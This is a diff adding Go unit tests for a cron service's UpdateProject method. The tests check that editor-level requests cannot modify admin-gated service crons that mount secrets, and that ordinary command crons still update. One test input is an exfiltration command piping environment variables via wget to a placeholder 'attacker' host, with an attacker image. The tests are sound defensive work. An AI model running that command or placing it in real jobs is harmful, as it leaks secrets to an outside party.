@@ -193,3 +193,55 @@ func TestCron_DeleteProject_RejectsCrossProjectQualifiedName(t *testing.T) {
 		t.Errorf("DeleteProject owner: %v", err)
 	}
 }
+
+// The project-cron PATCH is editor-gated; service crons mount the
+// service's envFromSecrets and are admin-gated on their own route, so
+// UpdateProject must not reach them. Live service crons carry kind="".
+func TestCron_UpdateProject_RefusesServiceCron(t *testing.T) {
+	t.Parallel()
+	for _, kind := range []string{"service", ""} {
+		cr := victimServiceCron()
+		cr.Spec.Kind = kind
+		cr.Spec.EnvFromSecrets = []string{"foo-bar-svc-secrets"}
+		s := cronFakeService(t, cr)
+		ctx := context.Background()
+		evil := []string{"sh", "-c", "env | wget --post-data=@- http://attacker"}
+		img := kube.KusoImage{Repository: "attacker/img", Tag: "latest"}
+		pin := true
+
+		_, err := s.UpdateProject(ctx, "foo-bar", "svc-nightly", UpdateProjectCronRequest{Command: evil, Image: &img, PinImage: &pin})
+		if !errors.Is(err, ErrInvalid) {
+			t.Fatalf("kind=%q: want ErrInvalid, got %v", kind, err)
+		}
+		got, gerr := s.Kube.GetKusoCron(ctx, "kuso", "foo-bar-svc-nightly")
+		if gerr != nil {
+			t.Fatalf("get cron: %v", gerr)
+		}
+		if got.Spec.Image != nil || len(got.Spec.Command) != 2 || got.Spec.PinImage {
+			t.Errorf("kind=%q: service cron mutated: %+v", kind, got.Spec)
+		}
+	}
+}
+
+func TestCron_UpdateProject_EditsCommandCron(t *testing.T) {
+	t.Parallel()
+	cr := &kube.KusoCron{
+		ObjectMeta: metav1.ObjectMeta{Name: "foo-job", Namespace: "kuso"},
+		Spec: kube.KusoCronSpec{
+			Project:  "foo",
+			Kind:     "command",
+			Schedule: "0 0 * * *",
+			Image:    &kube.KusoImage{Repository: "alpine", Tag: "3"},
+			Command:  []string{"echo", "a"},
+		},
+	}
+	s := cronFakeService(t, cr)
+	img := kube.KusoImage{Repository: "alpine", Tag: "3.20"}
+	got, err := s.UpdateProject(context.Background(), "foo", "job", UpdateProjectCronRequest{Command: []string{"echo", "b"}, Image: &img})
+	if err != nil {
+		t.Fatalf("UpdateProject command cron: %v", err)
+	}
+	if got.Spec.Image.Tag != "3.20" || got.Spec.Command[1] != "b" {
+		t.Errorf("command cron not updated: %+v", got.Spec)
+	}
+}
